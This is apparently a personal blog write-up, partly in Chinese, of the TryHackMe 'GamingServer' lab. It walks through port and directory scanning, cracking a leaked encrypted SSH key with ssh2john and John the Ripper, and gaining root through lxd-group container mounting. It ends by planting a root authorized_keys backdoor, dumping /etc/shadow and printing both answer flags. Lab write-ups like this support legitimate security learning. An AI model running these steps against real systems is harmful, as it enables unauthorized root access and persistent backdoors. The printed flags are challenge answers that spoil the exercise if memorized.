---
layout: post
title: "GamingServer"
date: "2023-08-15"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# GamingServer
An Easy Boot2Root box for beginners

tag: security, lxd, ssh2john, boot2root

Kali Linux : 10.18.72.222

Target IP Address : 10.10.245.174

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -Pn 10.10.245.174               
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-14 21:57 EDT
Nmap scan report for 10.10.245.174
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.80 seconds
```

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -Pn -sVC -p 22,80 10.10.245.174 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-14 21:58 EDT
Nmap scan report for 10.10.245.174
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds
```

访问：http://10.10.245.174/

[Gobuster](https://github.com/OJ/gobuster)

```
┌──(root㉿kali)-[~/Downloads]
└─# gobuster dir -u http://10.10.245.174/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php,.html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.245.174/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
2023/08/14 22:34:10 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 2762]
/about.html           (Status: 200) [Size: 1435]
/about.php            (Status: 200) [Size: 2213]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.245.174/uploads/]
/secret               (Status: 301) [Size: 315] [--> http://10.10.245.174/secret/]
/myths.html           (Status: 200) [Size: 3067]

===============================================================
2023/08/14 23:47:29 Finished
===============================================================
```

访问/uploads目录：http://10.10.245.174/uploads/

发现密码字典dict.lst

访问：http://10.10.245.174/secret/

发现私钥secretKey：

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

在主页的源码中发现如下注释，猜测用户名为john。

```
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

[Crack SSH Private Key Passwords with John the Ripper](https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/)

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh2john secretKey > secretKey.hash
```

```
┌──(root㉿kali)-[~/Downloads]
└─# john --wordlist=dict.lst secretKey.hash                     
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2023-08-14 23:33) 33.33g/s 7400p/s 7400c/s 7400C/s 2003..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
┌──(root㉿kali)-[~/Downloads]
└─# john --show secretKey.hash             
secretKey:letmein

1 password hash cracked, 0 left
```

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh -i secretKey john@10.10.245.174                
The authenticity of host '10.10.245.174 (10.10.245.174)' can't be established.
ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.245.174' (ED25519) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'secretKey' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "secretKey": bad permissions
john@10.10.245.174's password: 
```

```
┌──(root㉿kali)-[~/Downloads]
└─# chmod 400 secretKey
                                                                                                                                                             
┌──(root㉿kali)-[~/Downloads]
└─# ls -al secretKey
-r-------- 1 root root 1766 Aug 14 23:07 secretKey
```

输入破解后的密码：letmein，利用ssh成功以用户john的身份登录目标。

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh -i secretKey john@10.10.245.174
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 15 03:44:00 UTC 2023

  System load:  0.0               Processes:           107
  Usage of /:   41.2% of 9.78GB   Users logged in:     0
  Memory usage: 36%               IP address for eth0: 10.10.245.174
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
john@exploitable:~$ whoami
john
```

重启了Lab：

Target IP Address : 10.10.5.61

```
┌──(root㉿kali)-[~/Downloads]
└─# scp -i secretKey /root/Downloads/LinEnum.sh john@10.10.5.61:/home/john/LinEnum.sh   
Enter passphrase for key 'secretKey': 
LinEnum.sh                                                                                                                 100%   46KB  35.0KB/s   00:01
```

```
### SYSTEM ##############################################
[-] Kernel information:
Linux exploitable 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.15.0-76-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
exploitable
```

```
[+] We're a member of the (lxd) group - could possibly misuse these rights!
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

[lxd/lxc Group - Privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)


```
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
john@exploitable:~$ whoami
john
john@exploitable:~$ pwd
/home/john
john@exploitable:~$ ls -al
total 72
drwxr-xr-x 8 john john  4096 Aug 15 08:22 .
drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
drwx------ 2 john john  4096 Feb  5  2020 .cache
drwxr-x--- 3 john john  4096 Jul 27  2020 .config
drwx------ 3 john john  4096 Feb  5  2020 .gnupg
drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
-rw-r--r-- 1 john john   807 Apr  4  2018 .profile
drwx------ 2 john john  4096 Feb  5  2020 .ssh
-rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
-rw------- 1 root root 12070 Jul 27  2020 .viminfo
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

```
john@exploitable:~$ lxc list
+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

```
┌──(root㉿kali)-[~/Downloads]
└─# apt install -y git golang-go debootstrap rsync gpg squashfs-tools
```

```
┌──(root㉿kali)-[~/Downloads]
└─# git clone https://github.com/lxc/distrobuilder.git
Cloning into 'distrobuilder'...
remote: Enumerating objects: 6120, done.
remote: Counting objects: 100% (1696/1696), done.
remote: Compressing objects: 100% (583/583), done.
remote: Total 6120 (delta 1183), reused 1526 (delta 1089), pack-reused 4424
Receiving objects: 100% (6120/6120), 2.07 MiB | 150.00 KiB/s, done.
Resolving deltas: 100% (3969/3969), done.
```

```
┌──(root㉿kali)-[~/Downloads]
└─# cd distrobuilder

┌──(root㉿kali)-[~/Downloads/distrobuilder]
└─# ls -al
total 180
drwxr-xr-x 15 root root  4096 Aug 15 05:24 .
drwxrwxr-x  3 kali kali  4096 Aug 15 05:24 ..
-rw-r--r--  1 root root   243 Aug 15 05:24 AUTHORS
-rw-r--r--  1 root root  5496 Aug 15 05:24 CODE_OF_CONDUCT.md
-rw-r--r--  1 root root  2664 Aug 15 05:24 CONTRIBUTING.md
-rw-r--r--  1 root root 11358 Aug 15 05:24 COPYING
drwxr-xr-x  2 root root  4096 Aug 15 05:24 distrobuilder
drwxr-xr-x  6 root root  4096 Aug 15 05:24 doc
drwxr-xr-x  2 root root  4096 Aug 15 05:24 generators
drwxr-xr-x  8 root root  4096 Aug 15 05:24 .git
drwxr-xr-x  3 root root  4096 Aug 15 05:24 .github
-rw-r--r--  1 root root   131 Aug 15 05:24 .gitignore
-rw-r--r--  1 root root   218 Aug 15 05:24 .golangci.yml
-rw-r--r--  1 root root  4769 Aug 15 05:24 go.mod
-rw-r--r--  1 root root 63042 Aug 15 05:24 go.sum
drwxr-xr-x  2 root root  4096 Aug 15 05:24 image
-rw-r--r--  1 root root  2182 Aug 15 05:24 Makefile
drwxr-xr-x  2 root root  4096 Aug 15 05:24 managers
-rw-r--r--  1 root root   100 Aug 15 05:24 mkdocs.yml
-rw-r--r--  1 root root  3159 Aug 15 05:24 README.md
drwxr-xr-x  3 root root  4096 Aug 15 05:24 shared
drwxr-xr-x  2 root root  4096 Aug 15 05:24 sources
drwxr-xr-x  6 root root  4096 Aug 15 05:24 .sphinx
drwxr-xr-x  3 root root  4096 Aug 15 05:24 test
drwxr-xr-x  2 root root  4096 Aug 15 05:24 testdata
drwxr-xr-x  2 root root  4096 Aug 15 05:24 windows
```

这个错误提示表明你的系统无法连接到 `proxy.golang.org` 这个地址，因此无法下载所需的依赖包。`proxy.golang.org` 是一个 Go 模块的代理服务器，用于提供 Go 包的下载服务。

这可能是由于网络设置、防火墙或代理服务器等原因造成的。为了解决这个问题，你可以尝试以下方法：

3. **修改 Go 代理：** 你可以设置 Go 代理来解决下载问题。在终端中执行以下命令，将 Go 代理设置为可用的代理服务器：
   
   ```bash
   go env -w GOPROXY=https://goproxy.cn,direct
   ```

   这会将 Go 代理设置为 `https://goproxy.cn`，一个国内的代理服务器，可以帮助你下载 Go 依赖包。然后重新运行 `make` 命令。

```
┌──(root㉿kali)-[~/Downloads/distrobuilder]
└─# go env -w GOPROXY=https://goproxy.cn,direct

┌──(root㉿kali)-[~/Downloads/distrobuilder]
└─# make

distrobuilder built successfully
```

```
┌──(root㉿kali)-[~/Downloads/distrobuilder]
└─# mkdir -p $HOME/ContainerImages/alpine/

┌──(root㉿kali)-[~/Downloads/distrobuilder]
└─# cd $HOME/ContainerImages/alpine/

┌──(root㉿kali)-[~/ContainerImages/alpine]
└─# wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```

错误信息表明在下载 Alpine Linux 的根文件系统时遇到了问题。具体原因是因为 `https://mirror.csclub.uwaterloo.ca` 这个镜像站点无法连接，导致下载失败。可能的原因包括网络连接问题、镜像站点的故障等。

你可以尝试以下方法解决这个问题：

1. **更换镜像源：** 修改 `alpine.yaml` 配置文件中的 `source` 部分，将 `https://mirror.csclub.uwaterloo.ca` 修改为其他可用的 Alpine Linux 镜像源，例如 `https://dl-cdn.alpinelinux.org`。

5. **尝试其他镜像源：** 你可以尝试使用 Alpine Linux 官方提供的其他镜像源，如 `http://dl-cdn.alpinelinux.org`。

```
┌──(root㉿kali)-[~/ContainerImages/alpine]
└─# $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18.0
```

```
┌──(root㉿kali)-[~/ContainerImages/alpine]
└─# ls -al
total 3040
drwxr-xr-x 2 root root    4096 Aug 15 06:19 .
drwxr-xr-x 3 root root    4096 Aug 15 04:47 ..
-rw-r--r-- 1 root root   15893 Aug 15 06:03 alpine.yaml
-rw-r--r-- 1 root root     872 Aug 15 06:19 lxd.tar.xz
-rw-r--r-- 1 root root 3084288 Aug 15 06:19 rootfs.squashfs

┌──(root㉿kali)-[~/ContainerImages/alpine]
└─# pwd                                               
/root/ContainerImages/alpine
```

重启了Lab：

Target IP Address : 10.10.177.91

Then, upload to the vulnerable server the files lxd.tar.xz and rootfs.squashfs

```
┌──(root㉿kali)-[~/Downloads]
└─# scp -i secretKey /root/ContainerImages/alpine/lxd.tar.xz john@10.10.177.91:/home/john/lxd.tar.xz
Enter passphrase for key 'secretKey': 
lxd.tar.xz                                                                                                                 100%  872     3.5KB/s   00:00
```

```
┌──(root㉿kali)-[~/Downloads]
└─# scp -i secretKey /root/ContainerImages/alpine/rootfs.squashfs john@10.10.177.91:/home/john/rootfs.squashfs
Enter passphrase for key 'secretKey': 
rootfs.squashfs                                                                                                            100% 3012KB 550.8KB/s   00:05
```

```
john@exploitable:~$ ls -al
total 3088
drwxr-xr-x 8 john john    4096 Aug 15 10:41 .
drwxr-xr-x 3 root root    4096 Feb  5  2020 ..
lrwxrwxrwx 1 john john       9 Jul 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 john john     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 john john    3771 Apr  4  2018 .bashrc
drwx------ 2 john john    4096 Feb  5  2020 .cache
drwxr-x--- 3 john john    4096 Jul 27  2020 .config
drwx------ 3 john john    4096 Feb  5  2020 .gnupg
drwxrwxr-x 3 john john    4096 Jul 27  2020 .local
-rw-r--r-- 1 john john     872 Aug 15 10:40 lxd.tar.xz
-rw-r--r-- 1 john john     807 Apr  4  2018 .profile
-rw-r--r-- 1 john john 3084288 Aug 15 10:41 rootfs.squashfs
drwx------ 2 john john    4096 Feb  5  2020 .ssh
-rw-r--r-- 1 john john       0 Feb  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 john john      33 Feb  5  2020 user.txt
drwxr-xr-x 2 root root    4096 Feb  5  2020 .vim
-rw------- 1 root root   12070 Jul 27  2020 .viminfo
```

Add the image:

```
john@exploitable:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: 17babc88ab3b3342ab0127fa75852eecf87b687bf125ebf9a85a377d15d6019e
```

```
john@exploitable:~$ lxc image list
+--------+--------------+--------+-------------------------------------------+--------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |                DESCRIPTION                |  ARCH  |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+-------------------------------------------+--------+--------+-------------------------------+
| alpine | 17babc88ab3b | no     | Alpinelinux 3.18.0 x86_64 (20230815_1004) | x86_64 | 2.94MB | Aug 15, 2023 at 10:45am (UTC) |
+--------+--------------+--------+-------------------------------------------+--------+--------+-------------------------------+
```

Create a container and add root path

```
john@exploitable:~$ lxc init alpine privesc -c security.privileged=true
Creating privesc
john@exploitable:~$ lxc list
+---------+---------+------+------+------------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
```

```
john@exploitable:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
```

Execute the container:

```
john@exploitable:~$ lxc start privesc
john@exploitable:~$ lxc exec privesc /bin/sh
~ # 
```

cd /mnt/root #Here is where the filesystem is mounted

```
john@exploitable:~$ lxc exec privesc /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # whoami
root
~ # pwd
/root
~ # cd /mnt/root
```

```
~ # cd /mnt/root
/mnt/root # ls -al
total 2091112
drwxr-xr-x   24 root     root          4096 Feb  5  2020 .
drwxr-xr-x    3 root     root          4096 Aug 15 10:51 ..
drwxr-xr-x    2 root     root          4096 Feb  5  2020 bin
drwxr-xr-x    3 root     root          4096 Feb  5  2020 boot
drwxr-xr-x    2 root     root          4096 Feb  5  2020 cdrom
drwxr-xr-x   17 root     root          3700 Aug 15 10:30 dev
drwxr-xr-x   93 root     root          4096 Jul 27  2020 etc
drwxr-xr-x    3 root     root          4096 Feb  5  2020 home
lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img -> boot/initrd.img-4.15.0-76-generic
lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x   22 root     root          4096 Feb  5  2020 lib
drwxr-xr-x    2 root     root          4096 Aug  5  2019 lib64
drwx------    2 root     root         16384 Feb  5  2020 lost+found
drwxr-xr-x    2 root     root          4096 Aug  5  2019 media
drwxr-xr-x    2 root     root          4096 Aug  5  2019 mnt
drwxr-xr-x    2 root     root          4096 Aug  5  2019 opt
dr-xr-xr-x  115 root     root             0 Aug 15 10:30 proc
drwx------    3 root     root          4096 Feb  5  2020 root
drwxr-xr-x   27 root     root           920 Aug 15 10:48 run
drwxr-xr-x    2 root     root         12288 Feb  5  2020 sbin
drwxr-xr-x    4 root     root          4096 Feb  5  2020 snap
drwxr-xr-x    2 root     root          4096 Aug  5  2019 srv
-rw-------    1 root     root     2141192192 Feb  5  2020 swap.img
dr-xr-xr-x   13 root     root             0 Aug 15 10:30 sys
drwxrwxrwt   10 root     root          4096 Aug 15 10:45 tmp
drwxr-xr-x   10 root     root          4096 Aug  5  2019 usr
drwxr-xr-x   14 root     root          4096 Feb  5  2020 var
lrwxrwxrwx    1 root     root            30 Feb  5  2020 vmlinuz -> boot/vmlinuz-4.15.0-76-generic
lrwxrwxrwx    1 root     root            30 Feb  5  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
```

```
/mnt/root # cd root
/mnt/root/root # ls -al
total 32
drwx------    3 root     root          4096 Feb  5  2020 .
drwxr-xr-x   24 root     root          4096 Feb  5  2020 ..
-rw-------    1 root     root            42 Feb  5  2020 .bash_history
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
drwx------    2 root     root          4096 Feb  5  2020 .ssh
-rw-------    1 root     root          1090 Feb  5  2020 .viminfo
-rw-r--r--    1 root     root            33 Feb  5  2020 root.txt
/mnt/root/root # cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

向/root/.ssh写入公钥，以root用户身份ssh登录，实现权限维持。

```
/mnt/root/root # cd .ssh
/mnt/root/root/.ssh # echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVPU5GBfIfH/nULAuQp+HxCfMoJ8M4JjtARUOSsqdXfYXaHeyUpe1iYbuEAkHbTMDa/9WCwR/pzUSZYnrbc6p7HFo2dBpU5k//MgleASy+QRMbShkPv13z7doRR
/7+zXi1hQYNRfk03kZGd6WLokY2zS7SlXsAmaBleFZi/xaxwQKV4qRkHMEIXF0w2X6Pw+QqKbJFJWIh7krCih7tJd/dvvkyi7CCXeCUUHtjWwHqmnP+tN1FeeWqrXNl4/VtpkhgbaqHbECDCQpv7Kj2LvG7ZZzPjYHYdHxj0dUc6rWrLH2ABoguPy5TCs
LwVaTGpPmQo9fpfDlkQokeJx+xhiytRjxlgDbfUYvu6TtSxhoZ8Zn4dEwFIKr932ZWMWnVZSDrPJQWGkdi9oXeY6vD7CyItb8e0bBP0ERdF55GtZb/12RsUS8WdTYor2oW8XTlHpZCCDltdMnFQMNn/0qYrF6uJpKUCEnF631EKtcYR0dNtXZe/0irYva
12vpiZaiMCCE= root@kali" > authorized_keys
```

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i id_rsa root@10.10.177.91                                                          
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 15 10:59:33 UTC 2023

  System load:  0.0               Processes:             107
  Usage of /:   41.2% of 9.78GB   Users logged in:       1
  Memory usage: 40%               IP address for eth0:   10.10.177.91
  Swap usage:   0%                IP address for lxdbr0: 10.229.116.1


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@exploitable:~# whoami
root
root@exploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
root@exploitable:~# cat /etc/shadow
root:*:18113:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
sync:*:18113:0:99999:7:::
games:*:18113:0:99999:7:::
man:*:18113:0:99999:7:::
lp:*:18113:0:99999:7:::
mail:*:18113:0:99999:7:::
news:*:18113:0:99999:7:::
uucp:*:18113:0:99999:7:::
proxy:*:18113:0:99999:7:::
www-data:*:18113:0:99999:7:::
backup:*:18113:0:99999:7:::
list:*:18113:0:99999:7:::
irc:*:18113:0:99999:7:::
gnats:*:18113:0:99999:7:::
nobody:*:18113:0:99999:7:::
systemd-network:*:18113:0:99999:7:::
systemd-resolve:*:18113:0:99999:7:::
syslog:*:18113:0:99999:7:::
messagebus:*:18113:0:99999:7:::
_apt:*:18113:0:99999:7:::
lxd:*:18113:0:99999:7:::
uuidd:*:18113:0:99999:7:::
dnsmasq:*:18113:0:99999:7:::
landscape:*:18113:0:99999:7:::
pollinate:*:18113:0:99999:7:::
sshd:*:18297:0:99999:7:::
john:$6$VVR4T76c1et4UXQv$yD7d6Uyr5q5jFsb6mHROWAsAMIwWCF4ot.hmPuCnbHa1wB1lO4PBqx7DdkdNM3WfuUqXooebD6uuduDxXAQ8Z1:18297:0:99999:7:::
```

## Task 1: Boot2Root
Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

### Answer the questions below
What is the user flag?

a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

What is the root flag?

2e337b8c9f3aff0c2b3e8d4e6a7c88fc